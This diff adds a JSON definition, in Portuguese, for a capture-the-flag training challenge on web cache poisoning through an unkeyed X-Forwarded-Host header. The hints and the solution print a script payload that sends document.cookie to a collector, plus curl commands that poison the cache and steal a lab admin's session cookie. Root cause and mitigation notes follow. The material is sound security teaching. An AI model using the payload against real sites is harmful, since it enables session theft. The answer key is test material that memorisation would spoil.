@@ -1,0 +1,82 @@
+{
+  "slug": "adv-cache-poison-header",
+  "title": "Um visitante envenena a página",
+  "codename": "EDGELINE",
+  "summary": "A cache de borda usa como chave apenas o path das páginas, mas a home page reflete `X-Forwarded-Host` sem escape. Um request envenenado armazena script na cache compartilhada, e o próximo visitante o executa com a própria sessão.",
+  "category": "advanced",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "adv-cache-poison-header",
+  "estimated_minutes": 25,
+  "xp": 340,
+  "tech": [
+    "Flask",
+    "HTTP",
+    "Caching",
+    "XSS"
+  ],
+  "tags": [
+    "cache-poisoning",
+    "unkeyed-header",
+    "xss",
+    "edge-cache"
+  ],
+  "story": "A edge estática da Edgeline cacheia a home page para visitantes anônimos. A página renderiza um banner de marca a partir do valor de `X-Forwarded-Host` para que o time de marketing possa pré-visualizar hosts de staging. A cache não inclui esse header na chave.",
+  "objective": "Envenene `/home` com um script em `X-Forwarded-Host`, verifique que a response cacheada serve o script a um visitante limpo, dispare o bot de admin e leia o cookie capturado.",
+  "rules": "Permaneça na origem loopback atribuída. A cache, o bot e o collector fazem parte do lab.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie de sessão do admin",
+      "flag_type": "user",
+      "points": 340,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Quais inputs são cacheados?",
+      "body": "Requeira `/home` com e sem `X-Forwarded-Host` e compare o header `X-Cache`. O host refletido aparece no HTML, mas não na cache key.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Armazene um payload, não uma string",
+      "body": "Envie `X-Forwarded-Host: <script>fetch('/collect?c='+document.cookie)</script>`. O próximo request a `/home` sem o header retorna o body envenenado, porque a entrada de cache é compartilhada.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Deixe o admin ler",
+      "body": "Após envenenar, faça POST em `/report` para que o bot de admin visite `/home` com `admin_session` definido como a flag. O script envia o cookie para `/collect`; leia `/captured`.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "```bash\ncurl -H \"X-Forwarded-Host: <script>fetch('/collect?c='+document.cookie)</script>\" http://127.0.0.1:PORT/home\ncurl http://127.0.0.1:PORT/home   # servida da cache com o script\ncurl -X POST http://127.0.0.1:PORT/report\ncurl http://127.0.0.1:PORT/captured\n```\n\nO terceiro comando envia o bot de admin para a página envenenada. O script executa no browser do admin, exfiltra `admin_session` e o `/collect` registra a flag.",
+    "root_cause": "A aplicação reflete um header de request unkeyed no HTML, e a cache key omite esse header. Um atacante controla uma response armazenada para todos, transformando um valor refletido em uma injeção armazenada e compartilhada.",
+    "mitigation": "Normalize e faça encoding de headers refletidos, inclua na cache key todo input usado para gerar uma response, remova na borda headers de forwarding enviados pelo cliente e nunca cacheie responses que variam por headers de request sem uma política `Vary`. Adicione cookies `HttpOnly` e CSP como defesa em profundidade."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Web cache poisoning",
+      "url": "https://portswigger.net/web-security/web-cache-poisoning",
+      "source_type": "official",
+      "description": "Inputs unkeyed e impacto do cache poisoning."
+    },
+    {
+      "title": "OWASP — Web Cache Deception",
+      "url": "https://owasp.org/www-community/attacks/Web_Cache_Deception",
+      "source_type": "standard",
+      "description": "Comportamento de cache que expõe responses não intencionais."
+    },
+    {
+      "title": "MDN — Vary",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary",
+      "source_type": "official",
+      "description": "Declaração de quais headers de request selecionam uma response cacheada."
+    }
+  ]
+}
